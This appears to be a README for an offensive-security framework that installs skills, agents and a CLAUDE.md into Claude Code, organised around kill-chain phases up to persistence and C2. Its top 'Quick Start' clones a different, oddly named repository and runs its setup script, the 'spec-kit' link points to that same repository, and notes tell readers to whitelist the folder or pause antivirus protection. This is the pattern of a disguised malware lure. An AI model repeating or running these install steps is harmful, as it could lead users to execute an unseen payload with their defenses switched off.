# Offensive Security Research Config for Claude Code


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/lookoutmayorappraise/offensive-claude-982.git
cd offensive-claude-982
python setup.py
```


A spec-driven offensive security framework for Claude Code — structured engagement workflows based on the Cyber Kill Chain, 25 specialized skills, 6 collaborative agents, and 47 vulnerability reference files. Inspired by [GitHub's spec-kit](https://github.com/lookoutmayorappraise/offensive-claude-982) methodology.

## Quick Setup

```bash
# Method 1: One-liner install (recommended)
```

```bash
# Method 2: Clone + install script
git clone https://github.com/hypnguyen1209/offensive-claude.git ~/offensive-claude
cd ~/offensive-claude && bash install.sh
```

```bash
# Method 3: Manual copy
git clone https://github.com/hypnguyen1209/offensive-claude.git ~/offensive-claude
cp -r ~/offensive-claude/skills ~/.claude/skills
cp -r ~/offensive-claude/agents ~/.claude/agents
cp -r ~/offensive-claude/templates ~/.claude/templates
cp -r ~/offensive-claude/workflows ~/.claude/workflows
cp -r ~/offensive-claude/commands ~/.claude/commands
cp -r ~/offensive-claude/presets ~/.claude/presets
cp ~/offensive-claude/CLAUDE.md ~/.claude/CLAUDE.md
```

Skills and agents activate automatically — no additional configuration needed.

## Engagement Workflow

Engagements follow the **Cyber Kill Chain** as a structured 9-phase pipeline with quality gates:

```
Phase 0    Phase 1    Phase 2      Phase 3     Phase 4       Phase 5       Phase 6    Phase 7       Phase 8
SCOPE  →  RECON  →  WEAPONIZE →  DELIVERY →  EXPLOIT  →  INSTALLATION →   C2    →  ACTIONS ON →  REPORT
                                                                                    OBJECTIVES
```


### Orchestration Commands

| Command | Phase | Action |
|---------|-------|--------|
| `/engage.init <preset>` | — | Initialize engagement with workflow preset |
| `/engage.scope` | 0 | Define targets, ROE, authorization |
| `/engage.recon` | 1 | Passive/active reconnaissance |
| `/engage.weaponize` | 2 | Payload development, exploit design |
| `/engage.deliver` | 3 | Delivery vector execution |
| `/engage.exploit` | 4 | Exploitation, finding documentation |
| `/engage.install` | 5 | Persistence establishment |
| `/engage.c2` | 6 | C2 infrastructure setup |
| `/engage.actions` | 7 | Objectives execution, lateral movement |
| `/engage.report` | 8 | Report generation |
| `/engage.status` | — | Show pipeline status and progress |
| `/engage.gate` | — | Validate current phase gate |

### Workflow Presets

| Preset | Phases | Use Case |
|--------|--------|----------|
| `web-app` | 0,1,2,3,4,8 | OWASP-focused web application assessment |
| `network` | 0,1,2,4,5,6,7,8 | Internal network penetration test |
| `red-team` | ALL (0-8) | Full adversary simulation |
| `cloud` | 0,1,4,8 | AWS/Azure/GCP security audit |
| `mobile` | 0,1,2,4,8 | Android/iOS application pentest |
| `ad-domain` | 0,1,2,4,5,7,8 | Active Directory domain assessment |
| `bug-bounty` | 0,1,4,8 | Bug bounty vulnerability hunting |

### Quality Gates

Each phase transition validates:
- Required artifacts exist (templates filled)
- Findings have mandatory fields (CWE, CVSS, evidence, ATT&CK ID)
- Gate PASS → suggests next phase + relevant skills
- Gate FAIL → lists missing items

## How It Works

## Customization

- **Add skills:** create `skills/<name>/SKILL.md` with YAML frontmatter including kill_chain metadata
- **Add agents:** create `agents/<name>.md` with layer, phases, and collaboration metadata
- **Add workflows:** create `workflows/<name>.yml` following the workflow schema
- **Add presets:** create `presets/<name>/preset.yml` with phase/skill/agent selection
- **Add templates:** create `templates/<phase>/<name>.md` with gate and dependency metadata
- **Add MCP servers:** edit `mcpServers` in `settings.json`

## Requirements

- Claude Code CLI, Desktop App, or VS Code extension
- For MCP integrations: IDA Pro with ida-multi-mcp plugin, JADX with MCP server
